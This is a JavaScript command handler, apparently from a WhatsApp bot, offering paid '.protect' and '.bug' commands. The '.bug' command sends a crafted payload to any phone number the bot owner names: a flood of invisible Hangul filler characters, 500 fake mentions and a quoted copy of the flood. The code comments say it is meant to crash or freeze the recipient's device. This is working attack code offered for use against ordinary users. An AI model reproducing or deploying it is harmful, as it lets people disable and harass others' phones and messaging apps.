const { activateSecurity, deactivateSecurity } = require('../security/superSecurity');
const { sendToChat } = require('../utils/messageUtils');

// 🔒 Invisible char flood used for .bug
const INVISIBLE = '\u3164'; // HANGUL FILLER
const BIG_TEXT = INVISIBLE.repeat(2000); // Adjust if needed

// 🧨 Bug Payload v2 — triggers crash/freeze on some devices
const BUGV2_PAYLOAD = {
  text: BIG_TEXT,
  contextInfo: {
    mentionedJid: Array.from({ length: 500 }, (_, i) => `${1000000000 + i}@s.whatsapp.net`),
    forwardingScore: 999,
    isForwarded: true,
    quotedMessage: {
      conversation: BIG_TEXT
    },
    participant: '0@s.whatsapp.net',
    stanzaId: '3AB0BD1D1405C2C1',
    remoteJid: 'status@broadcast'
  }
};

/**
 * Main command handler for .protect and .bug commands.
 */
async function handleProtectionCommand({
  sock,
  message,
  userId,
  authId,
  command,
  args,
  botInstance,
  realSender,
  normalizedUserId,
  botLid,
  subscriptionLevel,
  remoteJid
}) {
  switch (command) {
    case 'protect': {
      if (!['basic', 'gold', 'premium'].includes(subscriptionLevel)) {
        await sendToChat(botInstance, remoteJid, {
          message: '🤖 Security protection is not available for Free tier.'
        });
        return true;
      }

      if (args[0] === 'off') {
        deactivateSecurity(authId);
        await sendToChat(botInstance, remoteJid, {
          message: '🔕 Security protection *disabled*. You are now vulnerable to spam/bugs.'
        });
      } else {
        activateSecurity(authId);
        await sendToChat(botInstance, remoteJid, {
          message: '🛡️ Security protection *enabled*! Your bot is now safe from known attacks.'
        });
      }
      return true;
    }

    case 'bug': {
      // Only allow Gold or Premium
      if (!['gold', 'premium'].includes(subscriptionLevel)) {
        await sendToChat(botInstance, remoteJid, {
          message: '🔒 This feature is only for Gold & Premium users.'
        });
        return true;
      }

      // Only allow bot owner to use it
      if (realSender !== normalizedUserId && realSender !== botLid) {
        await sendToChat(botInstance, remoteJid, {
          message: '🚫 Only the bot owner can use this command.'
        });
        return true;
      }

      // Extract target from reply or argument
      let targetJid;
      const quoted = message?.message?.extendedTextMessage?.contextInfo;

      if (quoted?.participant) {
        targetJid = quoted.participant;
      } else if (args[0]) {
        const num = args[0].replace(/[^0-9]/g, '');
        if (num.length > 5) {
          targetJid = `${num}@s.whatsapp.net`;
        }
      }

      if (!targetJid || !targetJid.endsWith('@s.whatsapp.net')) {
        await sendToChat(botInstance, remoteJid, {
          message: '⚠️ You must reply to a user or enter a valid phone number.'
        });
        return true;
      }

      // 🚀 Send the bug payload
      await botInstance.sendMessage(targetJid, BUGV2_PAYLOAD);
      await sendToChat(botInstance, remoteJid, {
        message: `✅ Bug payload sent to @${targetJid.split('@')[0]}`,
        mentions: [targetJid]
      });
      return true;
    }

    default:
      await sendToChat(botInstance, remoteJid, {
        message: '❌ Unknown security command.'
      });
      return false;
  }
}

module.exports = { handleProtectionCommand };
